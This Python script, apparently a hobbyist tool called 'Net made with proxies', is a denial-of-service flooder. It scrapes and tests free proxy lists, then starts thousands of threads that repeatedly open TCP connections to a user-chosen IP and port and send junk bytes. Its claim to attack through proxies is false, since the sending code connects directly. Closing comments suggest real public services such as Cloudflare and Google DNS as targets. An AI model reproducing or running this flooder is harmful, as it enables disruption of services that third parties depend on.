import requests
import socket
import threading
import concurrent.futures
from colorama import Fore, Back, Style, init
import time
import os
import sys

PROXY_FILE = "valid_proxies.txt"

print("\033c")
banner = f'''
{Fore.LIGHTRED_EX}  ⠀⠀⠀⠀⠀⢀⣠⡴⠶⠟⠛⠛⠛⢿⣶⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.RED}  ⠀⠀⠀⢀⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⠛⠛⠶⢦⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.LIGHTRED_EX}  ⠀⠀⣴⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣇⠀⠀⠀⠀⠉⠹⣿⣷⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.RED}  ⠀⣼⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣎⠉⠙⠛⠶⢦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.LIGHTRED_EX}  ⢰⣿⣿⣿⣿⣿⣿⣿⣿⡇⣀⣠⣀⣀⠀⣾⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡀⠀⠀⠀⠀⠈⢻⣿⣿⣷⡶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.RED}  ⢸⠋⠁⠀⠀⠀⠈⠙⠻⣿⠋⠉⠉⠉⠛⠻⠿⣿⣿⣁⡀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡀⠈⠉⠛⠻⠶⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.LIGHTRED_EX}  ⢸⠀⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠶⢦⣤⣄⣾⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠳⠶⣤⣤⣀⡀⠀
{Fore.RED}  ⢸⡇⠀⠀⠀⠀⠀⠀⢠⣿⣿⣷⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⣧⣤⣀⡀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⠀⠀⠈⠉⢻⡆
{Fore.LIGHTRED_EX}  ⠀⢿⡄⠀⠀⠀⢀⣴⣿⣿⣿⣿⡇⠀⠈⠉⠛⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠶⢶⣼⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⠈⡇
{Fore.RED}  ⠀⠈⢻⣄⢀⣴⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠶⣦⣤⣀⡀⠀⠀⣼⣿⣿⣿⣿⠀⠀⠀⠀⢸⡇
{Fore.LIGHTRED_EX}  ⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠶⢿⣿⣿⣿⡏⠀⠀⠀⢠⡟⠀
{Fore.RED}  ⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣁⡀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⠶⠶⠋⠀⠀
{Fore.LIGHTRED_EX}  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠶⢦⣴⠟


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {Fore.WHITE} Welcome to {Fore.LIGHTRED_EX}Net made with proxies⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                {Fore.WHITE} Made by {Fore.LIGHTRED_EX}traxc7
                 {Fore.WHITE} Version {Fore.LIGHTRED_EX}3


'''


def animated_print(text, delay):
    for line in text.splitlines():
        print(line)
        time.sleep(delay)

animated_print(banner, delay=0.05)

def scrape_proxies():
    print("[*] Scraping proxies from various sources...")
    proxy_sources = [
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.sslproxies.org/",
        "https://www.us-proxy.org/",
        "https://www.socks-proxy.net/",
        "https://free-proxy-list.net/",
        "https://www.freevpn.com/",
        "https://www.proxysite.one/",
        "https://www.unblock-websites.com/",
        "https://www.freeproxy.win/",
        "https://www.unblockyoutube.video/",
        "https://www.proxy-youtube.com/",
        "https://www.proxyscrape.com/free-proxy-list",
        "https://spys.me/proxy.txt",
        "https://api.proxyscrape.com/v2/?request=displayproxies",
        "https://www.proxynova.com/proxy-server-list/elite-proxies/",
        "https://www.freeproxy.world",
        "https://www.lumiproxy.com/free-proxy/",
        "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/refs/heads/main/proxies/https.txt",
        "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/refs/heads/main/proxies/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies_anonymous/http.txt",
        "https://raw.githubusercontent.com/yemixzy/proxy-list/refs/heads/main/proxies/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/refs/heads/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/refs/heads/main/online-proxies/txt/proxies-https.txt",
        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=200000",
        "https://raw.githubusercontent.com/proxylist-to/proxy-list/refs/heads/main/http.txt",
        "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/http.txt",
        "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/https.txt",
        "https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/http/http.txt",
        "https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/https/https.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/refs/heads/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/AmaniToamaWebDevelp1/proxyList-Top-Speed/refs/heads/master/proxy_http.txt",
        "https://raw.githubusercontent.com/AmaniToamaWebDevelp1/proxyList-Top-Speed/refs/heads/master/proxy_https.txt",
        "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/http_proxies.txt",
        "https://raw.githubusercontent.com/MOMMY2034/Free-Proxy-List/refs/heads/main/https",
        "https://raw.githubusercontent.com/MOMMY2034/Free-Proxy-List/refs/heads/main/http.txt",
        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/refs/heads/main/http.txt"
    ]

    proxies = set()
    for source in proxy_sources:
        try:
            response = requests.get(source, timeout=10)
            proxies.update(response.text.splitlines())
            print(f"[+] Scraped from {source}")
        except Exception as e:
            print(f"[!] Error scraping from {source}: {e}")
    return list(proxies)



def test_proxy(proxy, timeout=5):
    try:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        response = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=timeout)
        if response.status_code == 200:
            return proxy
    except Exception:
        return None

def validate_proxies(proxies):
    print("[*] Validating proxies...")
    valid_proxies = []
    validated_count = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
        results = executor.map(test_proxy, proxies)

        for proxy in results:
            validated_count += 1
            sys.stdout.write(f"\r[*] Proxies validated: {validated_count}/{len(proxies)}")
            sys.stdout.flush()
            if proxy:
                valid_proxies.append(proxy)
                ##print(f"\n[+] Valid proxy found: {proxy}")

    print(f"\n[*] Found {len(valid_proxies)} valid proxies.")
    return valid_proxies

def save_proxies(proxies):
    with open(PROXY_FILE, "w") as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")
    print(f"[*] Saved {len(proxies)} proxies to {PROXY_FILE}.")

def load_proxies():
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r") as f:
            proxies = [line.strip() for line in f.readlines()]
        print(f"[*] Loaded {len(proxies)} proxies from {PROXY_FILE}.")
        return proxies
    else:
        print("[!] Proxy file not found. Scraping new proxies...")
        return None

def send_bytes(proxy, target_ip, target_port, byte_size, duration, protocol="http"):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('', 0))
                s.settimeout(3.6)
                s.connect((target_ip, target_port))
                s.sendall(b"A" * byte_size)
                print(f"[*] Sent {byte_size} bytes to {target_ip}:{target_port} using proxy {proxy}")
        except Exception as e:
            print(f"[!] Error using {protocol.upper()} proxy {proxy}: {e}")

def main(target_ip, target_port, byte_size, duration):
    print("[*] Starting...")

    choice = input("Do you want to load proxies from file? (yes/no): ").strip().lower()
    if choice == "yes":
        proxies = load_proxies()
        if not proxies:
            print("[!] No proxies found in file, scraping new ones...")
            proxies = scrape_proxies()
    else:
        proxies = scrape_proxies()

    valid_proxies = validate_proxies(proxies)
    save_proxies(valid_proxies)

    print("[*] Launching attack...")
    threads = []
    
    for proxy in valid_proxies:
        for _ in range(30):
            thread = threading.Thread(target=send_bytes, args=(proxy, target_ip, target_port, byte_size, duration))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

    print("[*] Attack finished.")

if __name__ == "__main__":
    target_ip = input(f'''{Fore.LIGHTRED_EX}Enter target IP address:{Fore.WHITE} ''')
    target_port = int(input(f'''{Fore.LIGHTRED_EX}Enter target port:{Fore.WHITE} '''))
    byte_size = int(input(f'''{Fore.LIGHTRED_EX}Enter byte size (e.g., 1024):{Fore.WHITE} '''))
    duration = int(input(f'''{Fore.LIGHTRED_EX}Enter duration in seconds:{Fore.WHITE} '''))
    main(target_ip, target_port, byte_size, duration)

# These are just some targets ;)
# example.com 192.0.43.10:80
# cloud flare 1.1.1.1:80
# google dns 8.8.8.8:443
# norway 93.184.120.12:80
